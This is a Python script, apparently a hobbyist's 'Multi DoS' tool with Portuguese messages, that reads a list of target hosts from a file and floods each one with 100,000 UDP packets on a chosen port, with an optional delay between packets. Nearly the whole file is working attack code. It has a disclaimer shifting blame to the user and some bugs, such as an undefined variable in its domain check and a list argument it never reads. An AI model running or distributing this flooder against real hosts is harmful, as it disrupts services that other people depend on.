from colorama import Fore
import argparse
from urllib.parse import urlparse
import socket
import time

argparser = argparse.ArgumentParser(description="A Multi Target DoS Tool")
argparser.add_argument("lista", type=str, help="Lista de alvos que vão ser atacados")
argparser.add_argument("porta", type=int, help="Porta que vai ser efetuado o ataque")
argparser.add_argument("-t", "--timeout", type=float, help="Argumento opcional q fala quanto tempo demora entre um packet e outro ser enviado")
args = argparser.parse_args()

def dos(args):
   net = [".com", ".net", ".me", ".org", ".blog", ".br", ".gov"]
   ips = []
   with open("lista.txt", "r") as file:
       for linha in file:
           if linha in net:
              url = urlparse(url)
              neloc = f"{url.netloc}"
              ip = socket.gethostbyname(neloc)
              ips.append(ip)
           ips.append(linha.strip())
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   totalpack = 0
   msg = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⢔⣒⠂⣀⣀⣤⣄⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣴⣿⠋⢠⣟⡼⣷⠼⣎⣼⢇⣿⣄⠱⣄
⠀⠀⠀⠀⠀⠀⠹⣿⡀⣆⠙⠢⠐⠉⠉⣴⣾⣽⢟⡰⠃
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⠀⠤⢴⣿⠿⢋⣴⡏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⡙⠻⣿⣶⣦⣭⣉⠁⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠈⠉⠉⠉⠉⠇⡟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⠀⠀⣘⣦⣀⠀⠀⣀⡴⠊⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⢻⣿⣿⣿⣿⠻⣧⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠫⣿⠉⠻⣇⠘⠓⠂⣀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠈⠉⠉⠉⠀⠀
⢶⣾⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⣿⣿⣿⣿⣿⣿⣿⣧⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠙⠻⢿⣿⣿⠿⠛⣄⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
   print(Fore.LIGHTRED_EX + """

 ███▄ ▄███▓ █    ██  ██▓  ▄▄▄█████▓ ██▓   ▓█████▄  ▒█████    ██████ 
▓██▒▀█▀ ██▒ ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██▒   ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
▓██    ▓██░▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██▒   ░██   █▌▒██░  ██▒░ ▓██▄   
▒██    ▒██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██░   ░▓█▄   ▌▒██   ██░  ▒   ██▒
▒██▒   ░██▒▒▒█████▓ ░██████▒▒██▒ ░ ░██░   ░▒████▓ ░ ████▓▒░▒██████▒▒
░ ▒░   ░  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░▓      ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░  ░      ░░░▒░ ░ ░ ░ ░ ▒  ░  ░     ▒ ░    ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
░      ░    ░░░ ░ ░   ░ ░   ░       ▒ ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
       ░      ░         ░  ░        ░        ░        ░ ░        ░  
                                           ░                        
[!] Any damage caused with this tool is the sole responsibility of the user, the developer does not assume any responsibility caused by this tool.
""")
   time.sleep(2.5)
   for ip in ips:
       alvo = (ip, args.porta)
       numpack = 0
       for i in range(100000):
           sock.sendto(msg.encode(), alvo)
           numpack += 1
           print(Fore.RED + f"[+] Packet {numpack} enviado ao IP: {ip} pela porta: {args.porta}")
           totalpack += 1
   print(Fore.RESET + f"\n[+] Um total de {totalpack} packets foram enviados, ataques finalizados com sucesso!\n")

def dostime(args):
   ips = []
   with open("lista.txt", "r") as file:
       for linha in file:
           ips.append(linha.strip())
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   totalpack = 0
   msg = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⢔⣒⠂⣀⣀⣤⣄⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣴⣿⠋⢠⣟⡼⣷⠼⣎⣼⢇⣿⣄⠱⣄
⠀⠀⠀⠀⠀⠀⠹⣿⡀⣆⠙⠢⠐⠉⠉⣴⣾⣽⢟⡰⠃
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⠀⠤⢴⣿⠿⢋⣴⡏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⡙⠻⣿⣶⣦⣭⣉⠁⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠈⠉⠉⠉⠉⠇⡟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⠀⠀⣘⣦⣀⠀⠀⣀⡴⠊⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⢻⣿⣿⣿⣿⠻⣧⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠫⣿⠉⠻⣇⠘⠓⠂⣀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠈⠉⠉⠉⠀⠀
⢶⣾⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⣿⣿⣿⣿⣿⣿⣿⣧⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠙⠻⢿⣿⣿⠿⠛⣄⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
   print(Fore.LIGHTRED_EX + """

 ███▄ ▄███▓ █    ██  ██▓  ▄▄▄█████▓ ██▓   ▓█████▄  ▒█████    ██████
▓██▒▀█▀ ██▒ ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██▒   ▒██▀ ██▌▒██▒  ██▒▒██    ▒
▓██    ▓██░▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██▒   ░██   █▌▒██░  ██▒░ ▓██▄
▒██    ▒██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██░   ░▓█▄   ▌▒██   ██░  ▒   ██▒
▒██▒   ░██▒▒▒█████▓ ░██████▒▒██▒ ░ ░██░   ░▒████▓ ░ ████▓▒░▒██████▒▒
░ ▒░   ░  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░▓      ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░  ░      ░░░▒░ ░ ░ ░ ░ ▒  ░  ░     ▒ ░    ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
░      ░    ░░░ ░ ░   ░ ░   ░       ▒ ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░
       ░      ░         ░  ░        ░        ░        ░ ░        ░
                                           ░
[!] Any damage caused with this tool is the sole responsibility of the user, the develo>
""")
   time.sleep(2.5)
   for ip in ips:
       alvo = (ip, args.porta)
       numpack = 0
       for i in range(100000):
           time.sleep(args.timeout)
           sock.sendto(msg.encode(), alvo)
           numpack += 1
           print(Fore.RED + f"[+] Packet {numpack} enviado ao IP: {ip} pela porta: {args.porta}")
           totalpack += 1
   print(Fore.RESET + f"\n[+] Um total de {totalpack} packets foram enviados, ataques finalizados!\n")

def start(args):
    if args.timeout:
         dostime(args)
    elif args.lista and args.porta:
         dos(args)

start(args)
